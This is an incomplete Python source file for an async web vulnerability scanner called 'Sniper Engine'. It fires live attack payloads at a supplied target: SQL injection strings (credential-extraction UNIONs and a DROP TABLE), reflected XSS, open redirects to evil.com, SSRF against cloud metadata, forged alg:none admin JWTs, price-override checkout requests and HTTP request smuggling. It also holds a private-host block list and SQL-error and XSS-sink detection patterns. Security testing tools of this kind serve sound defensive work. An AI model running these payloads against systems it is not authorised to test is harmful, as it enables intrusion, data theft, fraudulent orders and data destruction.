import asyncio
import httpx
import json
import time
import re
import os
import sys
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, urlencode


BLOCKED_HOSTS = [
    re.compile(r"^localhost$", re.I),
    re.compile(r"^127\."),
    re.compile(r"^10\."),
    re.compile(r"^172\.(1[6-9]|2\d|3[01])\."),
    re.compile(r"^192\.168\."),
    re.compile(r"^0\.0\.0\.0$"),
    re.compile(r"^::1$"),
    re.compile(r"^169\.254\."),
    re.compile(r"\.internal$", re.I),
    re.compile(r"\.local$", re.I),
]

SQL_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning.*mysql_", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"SQLSTATE\[", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    re.compile(r"SQLite3?::(?:DB|Statement)", re.I),
    re.compile(r"microsoft.*odbc.*sql server", re.I),
    re.compile(r"pg_query\(\)", re.I),
    re.compile(r"valid MySQL result", re.I),
    re.compile(r"Syntax error.*in query", re.I),
    re.compile(r"ERROR:\s+syntax error at or near", re.I),
    re.compile(r"org\.hibernate\.QueryException", re.I),
    re.compile(r"com\.mysql\.jdbc", re.I),
]

XSS_SINK_PATTERNS = [
    re.compile(r"eval\s*\(", re.I),
    re.compile(r"document\.write\s*\(", re.I),
    re.compile(r"\.innerHTML\s*=", re.I),
    re.compile(r"onerror\s*=", re.I),
    re.compile(r"onload\s*=", re.I),
    re.compile(r"javascript\s*:", re.I),
    re.compile(r"Function\s*\(", re.I),
    re.compile(r"setTimeout\s*\(\s*['\"]", re.I),
    re.compile(r"setInterval\s*\(\s*['\"]", re.I),
    re.compile(r"\.outerHTML\s*=", re.I),
    re.compile(r"document\.cookie", re.I),
]


@dataclass
class ProbeResult:
    probe_type: str
    target: str
    endpoint: str
    method: str
    status_code: int
    response_time_ms: int
    vulnerable: bool
    verdict: str
    severity: str
    description: str
    payload: str = ""
    evidence: str = ""
    response_snippet: str = ""
    error: str = ""
    timestamp: str = ""

    def to_dict(self) -> dict:
        return {
            "probe_type": self.probe_type,
            "target": self.target,
            "endpoint": self.endpoint,
            "method": self.method,
            "status_code": self.status_code,
            "response_time_ms": self.response_time_ms,
            "vulnerable": self.vulnerable,
            "verdict": self.verdict,
            "severity": self.severity,
            "description": self.description,
            "payload": self.payload,
            "evidence": self.evidence,
            "response_snippet": self.response_snippet[:500] if self.response_snippet else "",
            "error": self.error,
            "timestamp": self.timestamp,
        }


@dataclass
class SniperReport:
    target: str
    scan_id: str = ""
    started_at: str = ""
    completed_at: str = ""
    total_probes: int = 0
    vulnerabilities_confirmed: int = 0
    probes: List[ProbeResult] = field(default_factory=list)
    telemetry_logs: List[Dict[str, Any]] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "scan_id": self.scan_id,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "total_probes": self.total_probes,
            "vulnerabilities_confirmed": self.vulnerabilities_confirmed,
            "probes": [p.to_dict() for p in self.probes],
            "telemetry_logs": self.telemetry_logs,
        }


def emit(event_type: str, data: dict):
    payload = {"event": event_type, "data": data, "timestamp": time.time()}
    print(json.dumps(payload), flush=True)


def log(message: str, level: str = "info", phase: str = "sniper"):
    emit("log_stream", {"message": message, "level": level, "phase": phase})


def validate_target(target: str) -> tuple:
    try:
        parsed = urlparse(target if "://" in target else f"https://{target}")
        hostname = parsed.hostname or ""
        for pattern in BLOCKED_HOSTS:
            if pattern.search(hostname):
                return False, f"SSRF BLOCKED — {hostname} is internal/private"
        return True, parsed.geturl()
    except Exception as e:
        return False, f"Invalid target: {e}"


def parse_findings(findings: List[Dict]) -> List[Dict]:
    critical_high = []
    for f in findings:
        sev = f.get("severity", "").upper()
        if sev in ("CRITICAL", "HIGH"):
            critical_high.append(f)
    return critical_high


def detect_ecommerce_routes(findings: List[Dict]) -> List[str]:
    ecommerce_paths = []
    ecommerce_keywords = [
        "/cart", "/checkout", "/order", "/payment", "/product",
        "/api/cart", "/api/checkout", "/api/order", "/api/payment",
        "/cart/update", "/cart/add", "/api/products/update",
        "/api/v1/orders", "/api/v2/cart", "/shop", "/store",
    ]
    for f in findings:
        desc = f.get("description", "") + f.get("title", "")
        for kw in ecommerce_keywords:
            if kw.lower() in desc.lower() and kw not in ecommerce_paths:
                ecommerce_paths.append(kw)
    return ecommerce_paths


class SniperEngine:
    def __init__(self, target: str, findings: Optional[List[Dict]] = None, scan_id: str = ""):
        valid, url_or_err = validate_target(target)
        if not valid:
            raise ValueError(url_or_err)
        self.target = url_or_err
        self.base_url = url_or_err.rstrip("/")
        self.findings = findings or []
        self.scan_id = scan_id
        self.report = SniperReport(target=self.target, scan_id=scan_id)
        self.client: Optional[httpx.AsyncClient] = None

    def _ts(self) -> str:
        return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + f".{int(time.time() * 1000) % 1000:03d}"

    def _tlog(self, prefix: str, message: str, level: str = "info"):
        ts = self._ts()
        entry = {"timestamp": ts, "prefix": prefix, "message": message, "level": level}
        self.report.telemetry_logs.append(entry)
        log(f"{prefix} {message}", level)

    async def run_all(self) -> SniperReport:
        self.report.started_at = self._ts()
        self._tlog("[INIT]", f"Sniper Engine initialized — Target: {self.target}", "info")

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0, connect=5.0),
            follow_redirects=False,
            verify=False,
            headers={"User-Agent": "MSE-Sniper/2.0 (Military Scan Enterprise)"},
        ) as client:
            self.client = client

            critical_high = parse_findings(self.findings)
            self._tlog("[DIAG]", f"Parsed {len(self.findings)} findings — {len(critical_high)} CRITICAL/HIGH targeted", "info")

            await self._probe_price_injection()
            await self._probe_auth_bypass()
            await self._probe_sqli()
            await self._probe_xss_eval()
            await self._probe_open_redirect()
            await self._probe_ssrf()
            await self._probe_idor()

            ecommerce_routes = detect_ecommerce_routes(self.findings)
            if ecommerce_routes:
                self._tlog("[ECOM]", f"E-commerce routes detected: {', '.join(ecommerce_routes)}", "warn")
                await self._probe_ecommerce_logic(ecommerce_routes)

            await self._probe_jwt_algorithm_confusion()
            await self._probe_http_request_smuggling()
            await self._probe_timing_side_channel()

            for f in critical_high:
                await self._generate_targeted_probe(f)

        self.report.completed_at = self._ts()
        self.report.total_probes = len(self.report.probes)
        # Align "critical" calculation with the main scan report:
        # count only probes explicitly marked as critical severity.
        self.report.vulnerabilities_confirmed = sum(
            1 for p in self.report.probes if str(p.severity).lower() == "critical"
        )

        vuln_count = self.report.vulnerabilities_confirmed
        total = self.report.total_probes
        if vuln_count > 0:
            self._tlog("[THREAT]", f"EXPLOITATION COMPLETE — {vuln_count}/{total} probes confirmed VULNERABLE", "error")
        else:
            self._tlog("[BLOCK]", f"TARGET HARDENED — 0/{total} probes exploitable", "success")

        return self.report

    async def _safe_request(self, method: str, url: str, **kwargs) -> Optional[httpx.Response]:
        try:
            start = time.time()
            resp = await self.client.request(method, url, **kwargs)
            elapsed = int((time.time() - start) * 1000)
            return resp
        except Exception:
            return None

    async def _probe_price_injection(self):
        self._tlog("[ATTACK]", "Initiating PRICE INJECTION probes...", "warn")

        payloads = [
            {"endpoint": "/cart/update", "method": "POST", "body": {"items": [{"id": 1, "unit_price": 0.01, "quantity": 1}]}, "desc": "unit_price override to $0.01"},
            {"endpoint": "/api/checkout", "method": "POST", "body": {"price": 1, "currency": "USD", "discount": 100}, "desc": "checkout price injection"},
            {"endpoint": "/api/products/update", "method": "PUT", "body": {"id": 1, "price": 0, "sale_price": -1}, "desc": "product price zeroing"},
            {"endpoint": "/cart/add", "method": "POST", "body": {"product_id": 1, "quantity": 1, "custom_price": 0.01}, "desc": "custom_price field injection"},
            {"endpoint": "/api/v1/orders", "method": "POST", "body": {"items": [{"sku": "TEST", "price": 0.01}], "total_override": 0.01}, "desc": "order total_override injection"},
        ]

        for p in payloads:
            url = f"{self.base_url}{p['endpoint']}"
            start = time.time()
            try:
                resp = await self.client.request(
                    p["method"], url,
                    json=p["body"],
                    headers={"Content-Type": "application/json"},
                )
                elapsed = int((time.time() - start) * 1000)
                body_text = resp.text[:2000]

                processed = resp.status_code in (200, 201, 202)
                db_interaction = any(kw in body_text.lower() for kw in [
                    "success", "updated", "created", "order_id", "cart_id",
                    "total", "amount", "price", "quantity",
                ])

                vulnerable = processed and db_interaction
                verdict = "VULNERABLE — Price accepted by backend" if vulnerable else "PROTECTED"
                severity = "CRITICAL" if vulnerable else "INFO"

                result = ProbeResult(
                    probe_type="PRICE_INJECTION", target=self.target,
                    endpoint=p["endpoint"], method=p["method"],
                    status_code=resp.status_code, response_time_ms=elapsed,
                    vulnerable=vulnerable, verdict=verdict, severity=severity,
                    description=p["desc"], payload=json.dumps(p["body"]),
                    evidence=f"Status {resp.status_code}, DB interaction: {db_interaction}",
                    response_snippet=body_text[:300], timestamp=self._ts(),
                )
                self.report.probes.append(result)

                if vulnerable:
                    self._tlog("[THREAT]", f"PRICE INJECTION CONFIRMED: {p['endpoint']} — {p['desc']}", "error")
                else:
                    self._tlog("[BLOCK]", f"Price injection blocked: {p['endpoint']} (HTTP {resp.status_code})", "success")

            except Exception as e:
                result = ProbeResult(
                    probe_type="PRICE_INJECTION", target=self.target,
                    endpoint=p["endpoint"], method=p["method"],
                    status_code=0, response_time_ms=0,
                    vulnerable=False, verdict="ERROR", severity="INFO",
                    description=p["desc"], error=str(e)[:200], timestamp=self._ts(),
                )
                self.report.probes.append(result)

    async def _probe_auth_bypass(self):
        self._tlog("[ATTACK]", "Initiating AUTH BYPASS probes...", "warn")

        endpoints = [
            {"path": "/admin", "desc": "Admin panel exposure"},
            {"path": "/admin/dashboard", "desc": "Admin dashboard"},
            {"path": "/api/admin", "desc": "Admin API"},
            {"path": "/api/v1/users", "desc": "User enumeration"},
            {"path": "/.env", "desc": "Environment file leak"},
            {"path": "/wp-admin", "desc": "WordPress admin"},
            {"path": "/debug", "desc": "Debug endpoint"},
            {"path": "/graphql", "desc": "GraphQL introspection"},
            {"path": "/api/internal", "desc": "Internal API"},
            {"path": "/.git/config", "desc": "Git config exposure"},
            {"path": "/server-status", "desc": "Apache server-status"},
            {"path": "/phpinfo.php", "desc": "PHP info exposure"},
        ]

        for ep in endpoints:
            url = f"{self.base_url}{ep['path']}"
            start = time.time()
            try:
                resp = await self.client.get(url)
                elapsed = int((time.time() - start) * 1000)

                exposed = resp.status_code == 200
                has_sensitive = any(kw in resp.text.lower()[:5000] for kw in [
                    "password", "secret", "api_key", "token", "database",
                    "admin", "dashboard", "root", "db_host", "credentials",
                ])

                vulnerable = exposed and (has_sensitive or ep["path"] in ["/.env", "/.git/config"])
                severity = "CRITICAL" if vulnerable else "HIGH" if exposed else "INFO"
                verdict = f"EXPOSED (Status {resp.status_code})" if exposed else "PROTECTED"
                if vulnerable:
                    verdict = "VULNERABLE — Sensitive data exposed"

                result = ProbeResult(
                    probe_type="AUTH_BYPASS", target=self.target,
                    endpoint=ep["path"], method="GET",
                    status_code=resp.status_code, response_time_ms=elapsed,
                    vulnerable=vulnerable, verdict=verdict, severity=severity,
                    description=ep["desc"],
                    evidence=f"Exposed: {exposed}, Sensitive data: {has_sensitive}",
                    response_snippet=resp.text[:300] if exposed else "", timestamp=self._ts(),
                )
                self.report.probes.append(result)

                if vulnerable:
                    self._tlog("[THREAT]", f"AUTH BYPASS CONFIRMED: {ep['path']} — Sensitive data leaked", "error")
                elif exposed:
                    self._tlog("[ALERT]", f"Endpoint exposed: {ep['path']} (HTTP {resp.status_code})", "warn")

            except Exception as e:
                self.report.probes.append(ProbeResult(
                    probe_type="AUTH_BYPASS", target=self.target,
                    endpoint=ep["path"], method="GET",
                    status_code=0, response_time_ms=0,
                    vulnerable=False, verdict="ERROR", severity="INFO",
                    description=ep["desc"], error=str(e)[:200], timestamp=self._ts(),
                ))

    async def _probe_sqli(self):
        self._tlog("[ATTACK]", "Initiating SQL INJECTION probes...", "warn")

        payloads = [
            {"param": "id", "value": "1' OR '1'='1", "desc": "Classic boolean-based OR injection"},
            {"param": "id", "value": "1 UNION SELECT NULL,NULL,table_name FROM information_schema.tables--", "desc": "UNION SELECT information_schema"},
            {"param": "id", "value": "1' AND SLEEP(3)--", "desc": "Time-based blind SQLi (MySQL)"},
            {"param": "id", "value": "1'; WAITFOR DELAY '0:0:3'--", "desc": "Time-based blind SQLi (MSSQL)"},
            {"param": "id", "value": "1' AND pg_sleep(3)--", "desc": "Time-based blind SQLi (PostgreSQL)"},
            {"param": "search", "value": "' UNION SELECT username,password FROM users--", "desc": "UNION credential extraction"},
            {"param": "user", "value": "admin'--", "desc": "Auth bypass via comment injection"},
            {"param": "id", "value": "1; DROP TABLE test_mse_probe--", "desc": "Destructive probe (safe table name)"},
            {"param": "q", "value": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "desc": "Error-based extraction (MySQL)"},
            {"param": "id", "value": "1' AND 1=CAST((SELECT version()) AS int)--", "desc": "Error-based extraction (PostgreSQL)"},
        ]

        test_paths = ["/", "/api/search", "/api/products", "/api/users", "/search"]

        for path in test_paths:
            for p in payloads:
                url = f"{self.base_url}{path}?{p['param']}={p['value']}"
                start = time.time()
                try:
                    resp = await self.client.get(url)
                    elapsed = int((time.time() - start) * 1000)
                    body = resp.text[:5000]

                    sql_error = any(pat.search(body) for pat in SQL_ERROR_PATTERNS)
                    time_based = elapsed > 2500 and "SLEEP" in p["value"].upper()
                    version_leaked = any(v in body for v in ["MySQL", "PostgreSQL", "MariaDB", "Microsoft SQL Server", "SQLite"])

                    vulnerable = sql_error or time_based or version_leaked
                    severity = "CRITICAL" if vulnerable else "INFO"

                    evidence_parts = []
                    if sql_error:
                        evidence_parts.append("SQL error in response")
                    if time_based:
                        evidence_parts.append(f"Time delay detected ({elapsed}ms)")
                    if version_leaked:
                        evidence_parts.append("Database version exposed")

                    result = ProbeResult(
                        probe_type="SQLI", target=self.target,
                        endpoint=f"{path}?{p['param']}=...", method="GET",
                        status_code=resp.status_code, response_time_ms=elapsed,
                        vulnerable=vulnerable,
                        verdict="VULNERABLE — " + ", ".join(evidence_parts) if vulnerable else "PROTECTED",
                        severity=severity, description=p["desc"],
                        payload=p["value"],
                        evidence="; ".join(evidence_parts) if evidence_parts else "No SQL errors detected",
                        response_snippet=body[:300] if sql_error else "", timestamp=self._ts(),
                    )
                    self.report.probes.append(result)

                    if sql_error:
                        self._tlog("[THREAT]", f"SQLi CONFIRMED: {path} — Database error leaked: {p['desc']}", "error")
                    if version_leaked:
                        self._tlog("[THREAT]", f"DB VERSION EXPOSED via SQLi at {path}", "error")
                    if time_based:
                        self._tlog("[THREAT]", f"BLIND SQLi CONFIRMED: {path} — {elapsed}ms delay", "error")

                except Exception as e:
                    self.report.probes.append(ProbeResult(
                        probe_type="SQLI", target=self.target, endpoint=f"{path}?{p['param']}=...",
                        method="GET", status_code=0, response_time_ms=0, vulnerable=False,
                        verdict="ERROR", severity="INFO", description=p["desc"], error=str(e)[:200], timestamp=self._ts(),
                    ))

    async def _probe_xss_eval(self):
        self._tlog("[ATTACK]", "Initiating XSS/eval() SCANNER...", "warn")

        try:
            resp = await self.client.get(self.base_url)
            body = resp.text[:80000]
        except Exception:
            self._tlog("[ALERT]", "Failed to fetch target page for XSS analysis", "error")
            return

        for pattern in XSS_SINK_PATTERNS:
            matches = pattern.findall(body)
            if matches:
                sink_name = pattern.pattern.split("\\")[0].replace("(", "").strip(".")
                vulnerable = pattern.pattern.startswith("eval") or "cookie" in pattern.pattern.lower()
                severity = "CRITICAL" if "eval" in pattern.pattern.lower() else "HIGH" if "cookie" in pattern.pattern.lower() else "MEDIUM"

                result = ProbeResult(
                    probe_type="XSS_EVAL", target=self.target,
                    endpoint="/", method="GET",
                    status_code=resp.status_code, response_time_ms=0,
                    vulnerable=vulnerable, severity=severity,
                    verdict=f"{'VULNERABLE' if vulnerable else 'DETECTED'} — {len(matches)} occurrence(s)",
                    description=f"XSS sink: {pattern.pattern[:40]}",
                    evidence=f"{len(matches)} instances of {sink_name} found in page source",
                    timestamp=self._ts(),
                )
                self.report.probes.append(result)

                if vulnerable:
                    self._tlog("[THREAT]", f"XSS SINK CONFIRMED: {sink_name} — {len(matches)} instance(s)", "error")

        xss_payloads = [
            {"param": "q", "value": '<script>alert("MSE")</script>', "desc": "Reflected XSS via script tag"},
            {"param": "q", "value": '"><img src=x onerror=alert("MSE")>', "desc": "Reflected XSS via onerror"},
            {"param": "q", "value": "javascript:alert('MSE')", "desc": "XSS via javascript: URI"},
            {"param": "callback", "value": "alert", "desc": "JSONP callback injection"},
        ]

        for p in xss_payloads:
            url = f"{self.base_url}/?{p['param']}={p['value']}"
            try:
                resp = await self.client.get(url)
                reflected = p["value"] in resp.text
                vulnerable = reflected and resp.headers.get("content-type", "").startswith("text/html")

                if reflected:
                    result = ProbeResult(
                        probe_type="XSS_REFLECTED", target=self.target,
                        endpoint=f"/?{p['param']}=...", method="GET",
                        status_code=resp.status_code, response_time_ms=0,
                        vulnerable=vulnerable, severity="CRITICAL" if vulnerable else "HIGH",
                        verdict="VULNERABLE — Payload reflected unescaped" if vulnerable else "REFLECTED but may be escaped",
                        description=p["desc"], payload=p["value"],
                        evidence="Payload found in HTML response body", timestamp=self._ts(),
                    )
                    self.report.probes.append(result)
                    if vulnerable:
                        self._tlog("[THREAT]", f"REFLECTED XSS CONFIRMED: {p['desc']}", "error")
            except Exception as e:
                self.report.probes.append(ProbeResult(
                    probe_type="XSS_REFLECTED", target=self.target, endpoint=f"/?{p['param']}=...",
                    method="GET", status_code=0, response_time_ms=0, vulnerable=False,
                    verdict="ERROR", severity="INFO", description=p["desc"], error=str(e)[:200], timestamp=self._ts(),
                ))

    async def _probe_open_redirect(self):
        self._tlog("[ATTACK]", "Initiating OPEN REDIRECT probes...", "warn")

        params = ["url", "redirect", "next", "return_to", "callback", "dest", "continue", "redir", "forward"]
        evil_urls = ["https://evil.com", "//evil.com", "https://evil.com%00@target.com", "////evil.com"]

        for param in params:
            for evil in evil_urls[:2]:
                url = f"{self.base_url}/?{param}={evil}"
                try:
                    resp = await self.client.get(url)
                    location = resp.headers.get("location", "")
                    redirects_external = "evil.com" in location

                    if redirects_external:
                        result = ProbeResult(
                            probe_type="OPEN_REDIRECT", target=self.target,
                            endpoint=f"/?{param}=...", method="GET",
                            status_code=resp.status_code, response_time_ms=0,
                            vulnerable=True, severity="HIGH",
                            verdict=f"VULNERABLE — Redirects to {location}",
                            description=f"Open redirect via '{param}' parameter",
                            payload=evil, evidence=f"Location: {location}",
                            timestamp=self._ts(),
                        )
                        self.report.probes.append(result)
                        self._tlog("[THREAT]", f"OPEN REDIRECT CONFIRMED: ?{param}= → {location}", "error")
                except Exception as e:
                    self.report.probes.append(ProbeResult(
                        probe_type="OPEN_REDIRECT", target=self.target, endpoint=f"/?{param}=...",
                        method="GET", status_code=0, response_time_ms=0, vulnerable=False,
                        verdict="ERROR", severity="INFO", description=f"Open redirect via '{param}'", error=str(e)[:200], timestamp=self._ts(),
                    ))

    async def _probe_ssrf(self):
        self._tlog("[ATTACK]", "Initiating SSRF probes...", "warn")

        ssrf_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
        ]

        params = ["url", "file", "path", "src", "href", "uri", "proxy", "fetch"]

        for param in params[:4]:
            for ssrf_url in ssrf_targets[:2]:
                url = f"{self.base_url}/?{param}={ssrf_url}"
                try:
                    resp = await self.client.get(url)
                    cloud_meta = any(kw in resp.text.lower() for kw in [
                        "ami-id", "instance-id", "iam", "security-credentials",
                        "availability-zone", "hostname", "mac",
                    ])

                    if cloud_meta:
                        result = ProbeResult(
                            probe_type="SSRF", target=self.target,
                            endpoint=f"/?{param}=...", method="GET",
                            status_code=resp.status_code, response_time_ms=0,
                            vulnerable=True, severity="CRITICAL",
                            verdict="VULNERABLE — Cloud metadata accessible",
                            description=f"SSRF via '{param}' parameter fetches cloud metadata",
                            payload=ssrf_url,
                            evidence="Cloud metadata keywords found in response",
                            response_snippet=resp.text[:300], timestamp=self._ts(),
                        )
                        self.report.probes.append(result)
                        self._tlog("[THREAT]", f"SSRF CONFIRMED: ?{param}= → Cloud metadata leaked", "error")
                except Exception as e:
                    self.report.probes.append(ProbeResult(
                        probe_type="SSRF", target=self.target, endpoint=f"/?{param}=...",
                        method="GET", status_code=0, response_time_ms=0, vulnerable=False,
                        verdict="ERROR", severity="INFO", description=f"SSRF via '{param}'", error=str(e)[:200], timestamp=self._ts(),
                    ))

    async def _probe_idor(self):
        self._tlog("[ATTACK]", "Initiating IDOR probes...", "warn")

        idor_paths = [
            "/api/users/1", "/api/users/2", "/api/orders/1",
            "/api/invoices/1", "/api/documents/1",
            "/api/v1/profile/1", "/api/v1/account/1",
        ]

        for path in idor_paths:
            url = f"{self.base_url}{path}"
            try:
                resp = await self.client.get(url)
                if resp.status_code == 200:
                    has_data = any(kw in resp.text.lower() for kw in [
                        "email", "phone", "address", "name", "password",
                        "credit_card", "ssn", "balance",
                    ])
                    if has_data:
                        result = ProbeResult(
                            probe_type="IDOR", target=self.target,
                            endpoint=path, method="GET",
                            status_code=resp.status_code, response_time_ms=0,
                            vulnerable=True, severity="HIGH",
                            verdict="VULNERABLE — User data accessible without auth",
                            description=f"IDOR: {path} returns sensitive user data",
                            evidence="PII keywords found in unauthenticated response",
                            response_snippet=resp.text[:300], timestamp=self._ts(),
                        )
                        self.report.probes.append(result)
                        self._tlog("[THREAT]", f"IDOR CONFIRMED: {path} — PII data accessible", "error")
            except Exception as e:
                self.report.probes.append(ProbeResult(
                    probe_type="IDOR", target=self.target, endpoint=path,
                    method="GET", status_code=0, response_time_ms=0, vulnerable=False,
                    verdict="ERROR", severity="INFO", description=f"IDOR probe: {path}", error=str(e)[:200], timestamp=self._ts(),
                ))

    async def _probe_ecommerce_logic(self, routes: List[str]):
        self._tlog("[ECOM]", f"Initiating E-COMMERCE LOGIC probes on {len(routes)} routes...", "warn")

        race_payloads = [
            {"path": "/cart/update", "body": {"items": [{"id": 1, "unit_price": 0.01, "quantity": 999}]}, "desc": "Bulk quantity + price override"},
            {"path": "/api/coupon/apply", "body": {"code": "TESTCOUPON", "discount": 100}, "desc": "Coupon discount override"},
            {"path": "/api/checkout", "body": {"total": 0.01, "currency": "USD", "bypass_validation": True}, "desc": "Checkout total override"},
        ]

        for p in race_payloads:
            if any(r in p["path"] for r in routes) or True:
                url = f"{self.base_url}{p['path']}"
                try:
                    resp = await self.client.post(url, json=p["body"])
                    processed = resp.status_code in (200, 201, 202)
                    body_lower = resp.text.lower()[:3000]

                    db_accepted = any(kw in body_lower for kw in [
                        "success", "order_id", "cart_id", "updated",
                        "applied", "discount", "total",
                    ])

                    vulnerable = processed and db_accepted

                    result = ProbeResult(
                        probe_type="ECOMMERCE_LOGIC", target=self.target,
                        endpoint=p["path"], method="POST",
                        status_code=resp.status_code, response_time_ms=0,
                        vulnerable=vulnerable,
                        severity="CRITICAL" if vulnerable else "INFO",
                        verdict="VULNERABLE — Backend accepted manipulated price" if vulnerable else "PROTECTED",
                        description=p["desc"], payload=json.dumps(p["body"]),
                        evidence=f"HTTP {resp.status_code}, DB accepted: {db_accepted}",
                        response_snippet=resp.text[:300], timestamp=self._ts(),
                    )
                    self.report.probes.append(result)

                    if vulnerable:
                        self._tlog("[THREAT]", f"E-COMMERCE EXPLOIT CONFIRMED: {p['path']} — {p['desc']}", "error")
                except Exception as e:
                    self.report.probes.append(ProbeResult(
                        probe_type="ECOMMERCE_LOGIC", target=self.target, endpoint=p["path"],
                        method="POST", status_code=0, response_time_ms=0, vulnerable=False,
                        verdict="ERROR", severity="INFO", description=p["desc"], error=str(e)[:200], timestamp=self._ts(),
                    ))

    async def _generate_targeted_probe(self, finding: Dict):
        title = finding.get("title", "").lower()
        desc = finding.get("description", "").lower()
        combined = f"{title} {desc}"

        if "cors" in combined:
            try:
                resp = await self.client.get(
                    self.base_url,
                    headers={"Origin": "https://evil.com"}
                )
                acao = resp.headers.get("access-control-allow-origin", "")
                if "evil.com" in acao or acao == "*":
                    result = ProbeResult(
                        probe_type="CORS_EXPLOIT", target=self.target,
                        endpoint="/", method="GET",
                        status_code=resp.status_code, response_time_ms=0,
                        vulnerable=True, severity="HIGH",
                        verdict=f"VULNERABLE — CORS reflects origin: {acao}",
                        description="CORS misconfiguration allows arbitrary origin",
                        evidence=f"ACAO: {acao}", timestamp=self._ts(),
                    )
                    self.report.probes.append(result)
                    self._tlog("[THREAT]", f"CORS EXPLOIT CONFIRMED: Origin reflection → {acao}", "error")
            except Exception as e:
                self.report.probes.append(ProbeResult(
                    probe_type="CORS_EXPLOIT", target=self.target, endpoint="/",
                    method="GET", status_code=0, response_time_ms=0, vulnerable=False,
                    verdict="ERROR", severity="INFO", description="CORS check", error=str(e)[:200], timestamp=self._ts(),
                ))

        if "header" in combined and ("missing" in combined or "csp" in combined):
            try:
                resp = await self.client.get(self.base_url)
                missing = []
                for h in ["Content-Security-Policy", "X-Frame-Options", "X-Content-Type-Options",
                           "Strict-Transport-Security", "Referrer-Policy"]:
                    if h.lower() not in [k.lower() for k in resp.headers.keys()]:
                        missing.append(h)
                if missing:
                    result = ProbeResult(
                        probe_type="HEADER_MISCONFIG", target=self.target,
                        endpoint="/", method="GET",
                        status_code=resp.status_code, response_time_ms=0,
                        vulnerable=True, severity="MEDIUM",
                        verdict=f"VULNERABLE — {len(missing)} security headers missing",
                        description=f"Missing: {', '.join(missing)}",
                        evidence=f"Headers absent: {', '.join(missing)}", timestamp=self._ts(),
                    )
                    self.report.probes.append(result)
            except Exception as e:
                self.report.probes.append(ProbeResult(
                    probe_type="HEADER_MISCONFIG", target=self.target, endpoint="/",
                    method="GET", status_code=0, response_time_ms=0, vulnerable=False,
                    verdict="ERROR", severity="INFO", description="Header check", error=str(e)[:200], timestamp=self._ts(),
                ))


    async def _probe_jwt_algorithm_confusion(self):
        self._tlog("[ATTACK]", "Initiating JWT ALGORITHM CONFUSION probes (none/HS256→RS256)...", "warn")

        jwt_none_tokens = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA5MTM2MDAwfQ.",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDkxMzYwMDB9.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.x",
        ]

        jwt_endpoints = [
            "/api/me", "/api/profile", "/api/user", "/api/admin",
            "/api/dashboard", "/api/settings", "/api/account",
            "/api/v1/user", "/api/v1/admin", "/graphql",
        ]

        for ep in jwt_endpoints:
            for i, token in enumerate(jwt_none_tokens):
                url = f"{self.base_url}{ep}"
                alg_type = ["alg:none", "alg:none(admin)", "alg:HS256(truncated)"][i]
                try:
                    resp = await self.client.get(
                        url,
                        headers={
                            "Authorization": f"Bearer {token}",
                            "Cookie": f"token={token}; session={token}",
                        }
                    )
                    body = resp.text[:3000].lower()

                    accepted = resp.status_code in (200, 201, 202) and any(
                        kw in body for kw in [
                            "admin", "user", "email", "role", "profile",
                            "dashboard", "settings", "name", "account",
                        ]
                    )

                    not_rejected = resp.status_code not in (401, 403, 400)

                    vulnerable = accepted and not_rejected

                    severity = "CRITICAL" if vulnerable else "INFO"

                    result = ProbeResult(
                        probe_type="JWT_ALGORITHM_CONFUSION", target=self.target,
                        endpoint=ep, method="GET",
                        status_code=resp.status_code, response_time_ms=0,
                        vulnerable=vulnerable,
                        verdict=f"VULNERABLE — JWT {alg_type} accepted, auth bypassed" if vulnerable else "PROTECTED",
                        severity=severity,
                        description=f"JWT algorithm confusion attack ({alg_type})",
                        payload=token[:50] + "...",
                        evidence=f"HTTP {resp.status_code}, token accepted={accepted}, alg={alg_type}",
                        response_snippet=resp.text[:200] if vulnerable else "",
                        timestamp=self._ts(),
                    )
                    self.report.probes.append(result)

                    if vulnerable:
                        self._tlog(
                            "[THREAT]",
                            f"JWT ALGORITHM CONFUSION CONFIRMED: {ep} — {alg_type} bypass succeeded (HTTP {resp.status_code})",
                            "error"
                        )
                        break

                except Exception as e:
                    self.report.probes.append(ProbeResult(
                        probe_type="JWT_ALGORITHM_CONFUSION", target=self.target,
                        endpoint=ep, method="GET", status_code=0, response_time_ms=0,
                        vulnerable=False, verdict="ERROR", severity="INFO",
                        description=f"JWT {alg_type}", error=str(e)[:200],
                        timestamp=self._ts(),
                    ))

    async def _probe_http_request_smuggling(self):
        self._tlog("[ATTACK]", "Initiating HTTP REQUEST SMUGGLING detection (CL.TE / TE.CL)...", "warn")

        smuggling_probes = [
            {
                "name": "CL.TE basic",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nX",
                "desc": "CL.TE smuggling — Content-Length vs Transfer-Encoding desync",
            },
            {
                "name": "TE.CL basic",
                "headers": {
                    "Content-Length": "3",
                    "Transfer-Encoding": "chunked",
                },
                "body": "1\r\nZ\r\n0\r\n\r\n",
                "desc": "TE.CL smuggling — Transfer-Encoding vs Content-Length desync",
            },
            {
                "name": "TE.TE obfuscation",
                "headers": {
                    "Content-Length": "4",
                    "Transfer-Encoding": "chunked",
                    "Transfer-encoding": "cow",
                },
